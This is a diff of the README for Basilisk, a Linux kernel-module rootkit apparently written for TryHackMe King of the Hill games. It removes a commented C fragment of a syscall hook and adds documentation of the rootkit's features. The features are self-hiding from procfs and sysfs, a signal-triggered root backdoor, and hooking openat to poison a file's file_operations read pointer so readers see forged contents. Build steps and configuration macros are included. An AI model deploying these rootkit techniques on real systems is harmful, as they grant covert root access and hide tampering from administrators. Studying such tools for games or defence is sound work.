@@ -1,74 +1,42 @@
-/*
- * struct fd {
- *	struct file *file;
- *	unsigned int flags;
- * };
- * struct file {
- 	*
-	* Protects f_ep, f_flags.
-	* Must not be taken from IRQ context.
-	*
-	spinlock_t		f_lock;
-	fmode_t			f_mode;
-	atomic_long_t		f_count;
-	struct mutex		f_pos_lock;
-	loff_t			f_pos;
-	unsigned int		f_flags;
-	struct fown_struct	f_owner;
-	const struct cred	*f_cred;
-	struct file_ra_state	f_ra;
-	struct path		f_path; <-- THIS IS WHAT WE ARE AFTER
-	struct inode		*f_inode;	* cached value 
-	const struct file_operations	*f_op;
-	
-	[ REDACTED ]
- * }
- *
- * struct path {
-	struct vfsmount *mnt;
-	struct dentry *dentry;
- * } __randomize_layout;
- *
+# Basilisk
+Basilisk is a Linux Loaded Kernel Module (**LKM**) rootkit designed specifically to win TryHackMe's King of The Hill (**KoTH**) games.
 
-    struct fd f = fdget_pos(fd);
-    struct path f_path = f.file->f_path;    
-    
-    // d_path stuff
-    char *ret_ptr = NULL; 
-    char *tpath = kmalloc(1024, GFP_KERNEL);
-   
-    int ret;
-    char *filename = "king.txt";
-    char *resolved_filename;
-    
-    ret_ptr = d_path(&f_path, tpath, 1024);
-    if (IS_ERR(ret_ptr))
-	pr_err("basilisk: d_path failed\n");
-	goto out_err;
-    
+## Key features
+- Self-hiding from procfs and sysfs via signal `SIG_HIDE`
+- Root backdoor via signal `SIG_ROOT`
+- Advanced king protection (see [here](#protecting-the-king))
 
-    resolved_filename = strrchr(ret_ptr, '/');
-    if (resolved_filename)
-        resolved_filename++; 
-    else
-        resolved_filename = ret_ptr; 
+## Usage
+```bash
+$ git clone https://github.com/lil-skelly/basilisk
+[...]
+$ cd basilisk/src && make
+[...]
+```
+You can customize the LKM by modifying the following macros:
+```c
+#define SIG_HIDE 63;
+#define SIG_ROOT 64;
 
-    // Compare the extracted filename with the provided filename
-    ret = strcmp(resolved_filename, filename) == 0;
-    if (ret)
-	pr_info("basilisk: attempt reading king.txt");
-        goto out_err;
+#define KING_FILENAME "/root/king.txt" // Path to king file
 
-    fdput_pos(f);
-    path_put(&f_path);
-    kfree(tpath);
-    
-    return orig_read(regs);
+#define KING "SKELLY\n" // King
+```
+The signals used for hiding/showing the module and for the root backdoor are common amongst rootkits. 
+I highly advice you change them to something less predictable from the range 32-64 (unused signals/process specific)
 
-out_err:
-    fdput_pos(f);
-    path_put(&f_path);
-    kfree(tpath);
-    return -EIO;
- * We can use the path struct to pass it in the function d_path in order to retrieve the filename.
- * */
+## Protecting the King
+At first glance, the goal of a KoTH game is to root the machine and place your username inside the king file (`/root/king.txt`).
+
+The real challenge is to **keep** your name in there. To do that, basilisk utilizes a new technique focusing on manipulating the file operations structure of the king file (`/root/king.txt`).
+
+First, basilisk hooks the `openat` syscall and resolves the path from the given file descriptor.
+If the path is that of our king file, it opens a new file descriptor by calling the original `openat` syscall, poisons the files `file_operations` structure and returns the file descriptor to our now poisoned file.
+
+We poisoned the file operations structure by making the `read` field point to the address of our **own** implementation of the read syscall.
+Now every time somebody reads from the king file, it will always read our name! Despite what its actual contents are.
+
+In the KoTH scene, hooking the read syscall is not new.
+But we are not just hooking any read syscall. We are only hooking the read syscall which will be used to read from that very specific file.
+
+Furthermore, the function that is resolving the final path also follows any symbolic links/mount points so there is no way around it ? ? ?
